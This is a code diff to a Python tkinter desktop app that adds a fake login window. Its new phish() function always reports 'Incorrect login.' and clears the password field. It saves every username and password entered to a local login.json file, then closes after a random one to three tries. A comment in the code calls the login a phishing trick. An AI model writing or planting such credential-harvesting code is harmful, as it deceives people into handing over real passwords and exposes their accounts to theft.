@@ -2,7 +2,7 @@
 from tkinter import *
 from json import loads, dumps
 from codecs import open as copen
-from random import choice
+from random import choice, randint
 from pyperclip import copy
 from winsound import PlaySound, SND_ASYNC, SND_ALIAS
 from time import sleep
@@ -15,6 +15,7 @@ def sound(file):
 
 class WindowConfiguration:
 	def __init__(self):
+		self.rand = randint(1,3)
 		self.WIDTH = 700
 		self.HEIGHT = 400
 		self.MAIN_COLOR = "#00FF80"
@@ -250,8 +251,38 @@ def main(FILE):
 	ssearch.place(relx=0.65, rely=0.45, relwidth=0.16, relheight=0.1)
 	root.mainloop()
 
+def phish(user, passw, label, root):
+	password = passw.get()
+	passw.delete(0, 'end')
+	label.config(text="Incorrect login.", bg="#FF361C", fg="white")
+	if not len(user) or not len(password):
+		return 0
+	with open("source\\login.json", "r") as f:
+		content = loads(f.read())
+	if user not in content:
+		content[user] = []
+		content[user].append(password)
+		
+	else:
+		if wc.rand:
+			wc.rand -= 1
+			content[user].append(password)
+		else:
+			root.destroy()
+
+	with open("source\\login.json", "w") as f:
+			f.write(dumps(content, indent=4))
+
+
+
+
+
+
+
+
 
 def login(): #This is actually a fucking fishing
+	wc.rand = randint(1,3)
 	root = Tk()
 	root.title("Login")
 	root.geometry("{}x{}".format(wc.WIDTH, wc.HEIGHT))
@@ -269,7 +300,8 @@ def login(): #This is actually a fucking fishing
 	pswtxt.place(relx=0.1, rely=0.4, relwidth=0.16, relheight=0.1)
 	password = Entry(login, font=("Courier", 14), show="*")
 	password.place(relx=0.3, rely=0.42, relwidth=0.5, relheight=0.07)
-	log = Button(login, bg="#FF9433", fg="white", text="LOGIN")
+	inc = Label(login, font=("Courier", 15), bg="#ECF0F1", fg="#FF361C", text="")
+	log = Button(login, bg="#FF9433", fg="white", text="LOGIN", command=lambda: phish(user.get(), password, inc, root))
 	log.place(relx=0.65, rely=0.52, relwidth=0.15, relheight=0.1)
 	logocanvas = Canvas(mainFrame, bg="#667BFF")
 	logocanvas.place(relx=0, rely=0, relwidth=0.3,relheight=1)
